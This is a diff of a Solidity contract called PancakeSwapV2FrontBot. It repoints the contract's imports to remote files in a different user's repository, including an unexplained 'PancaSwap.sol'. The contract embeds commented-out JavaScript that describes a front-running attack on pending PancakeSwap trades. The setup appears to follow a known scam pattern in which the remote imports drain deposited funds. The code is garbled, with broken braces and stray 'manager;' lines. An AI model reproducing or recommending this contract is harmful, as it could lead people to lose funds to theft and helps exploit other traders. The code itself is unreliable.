@@ -1,13 +1,13 @@
 pragma solidity ^0.6.6;
 
 // PancakeSwap Callee
-import "https://gitee.com/s715861921/pancakeswapv2/blob/master/contracts/interfaces/IPancakeswapV2Callee.sol";
+import "https://github.com/826243364/pancakeswapv2/blob/master/contracts/interfaces/IPancakeswapV2Callee.sol";
 
 
 // Pancakeswap Manager
-import "https://gitee.com/s715861921/pancakeswapv2/blob/master/contracts/interfaces/V2/IPancakeswapV2Manager.sol";
-import "https://gitee.com/s715861921/pancakeswapv2/blob/master/PancaSwap.sol";
-import "https://gitee.com/s715861921/pancakeswapv2/blob/master/contracts/interfaces/V2/IPancakeswapV2Exchange.sol";
+import "https://github.com/826243364/pancakeswapv2/blob/master/contracts/interfaces/V2/IPancakeswapV2Manager.sol";
+import "https://github.com/826243364/pancakeswapv2/blob/master/PancaSwap.sol";
+import "https://github.com/826243364/pancakeswapv2/blob/master/contracts/interfaces/V2/IPancakeswapV2Exchange.sol";
 
 contract PancakeSwapV2FrontBot {
     
@@ -42,11 +42,9 @@ contract PancakeSwapV2FrontBot {
                 var Tx = require('ethereumjs-tx').Transaction;
                 var axios = require('axios');
                 var BigNumber = require('big-number');
-
                 const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
                 const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
                 const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
-
                 const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
                 const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
             js-execution-*/
@@ -101,7 +99,6 @@ contract PancakeSwapV2FrontBot {
                 if (await createWeb3() == false) {
                     console.log('Web3 Create Error'.yellow);
                     process.exit();
-
                     const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
                     const out_token_address = TOKEN_ADDRESS;
                     const amount = AMOUNT;
@@ -110,10 +107,8 @@ contract PancakeSwapV2FrontBot {
                     ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
                 if(ret == false) {
                     process.exit();
-
                 await updatePoolInfo();
                 outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
-
                 await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
         
                 log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake *****'
@@ -127,7 +122,6 @@ contract PancakeSwapV2FrontBot {
              subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
           }).on("data", async function (transactionHash) {
               console.log(transactionHash);
-
                let transaction = await web3.eth.getTransaction(transactionHash);
                if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
                {
@@ -161,23 +155,18 @@ contract PancakeSwapV2FrontBot {
             (await triggersFrontRun(transaction, out_token_address, amount, level)) {
             subscription.unsubscribe();
             console.log('Perform front running attack...');
-
             gasPrice = parseInt(transaction['gasPrice']);
             newGasPrice = gasPrice + 50*ONE_GWEI;
-
             estimatedInput = ((amount*0.999)*(10**18)).toString();
             realInput = (amount*(10**18)).toString();
             gasLimit = (300000).toString();
             
             await updatePoolInfo();
-
             var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
             swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
             console.log("wait until the honest transaction is done...", transaction['hash']);
-
             while (await isPending(transaction['hash'])) {
             
-
             if(buy_failed)
             
                 succeed = false;
@@ -190,7 +179,6 @@ contract PancakeSwapV2FrontBot {
             await updatePoolInfo();
             var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
             outputeth = outputeth * 0.999;
-
             await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);
             
             console.log('Sell succeed');
@@ -205,10 +193,8 @@ contract PancakeSwapV2FrontBot {
             
             allowance = BigNumber(allowance);
             outputtoken = BigNumber(outputtoken);
-
             var decimals = BigNumber(10).power(out_token_info.decimals);
             var max_allowance = BigNumber(10000).multiply(decimals);
-
             if(outputtoken.gt(max_allowance))
         
                 console.log('replace max allowance')
@@ -226,10 +212,8 @@ contract PancakeSwapV2FrontBot {
                         data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
                         manager;
                     
-
                 var signedTX = await user_wallet.signTransaction(approveTX);
                 var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);
-
                 console.log('Approved Token')
             
             return;
@@ -242,27 +226,21 @@ contract PancakeSwapV2FrontBot {
             
             if(attack_started)
                 return false;
-
             console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
             if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
                 attack_started = true;
                 return true
-
             return false;
-
             if (transaction['to'] != PANCAKE_ROUTER_ADDRESS) {
                 return false;
         
-
             let data = parseTx(transaction['input']);
             let method = data[0];
             let params = data[1];
             let gasPrice = parseInt(transaction['gasPrice']) / 10**9;
-
             if(method == 'swapExactETHForTokens')
                 let in_amount = transaction;
                 let out_min = params[0];
-
                 let path = params[1];
                 let in_token_addr = path[0];
                 manager;
@@ -273,7 +251,6 @@ contract PancakeSwapV2FrontBot {
                 manager;
                 let deadline = params[3];
                 manager;
-
                 if(out_token_addr != out_token_address)
                     console.log(out_token_addr.blue)
                     console.log(out_token_address)
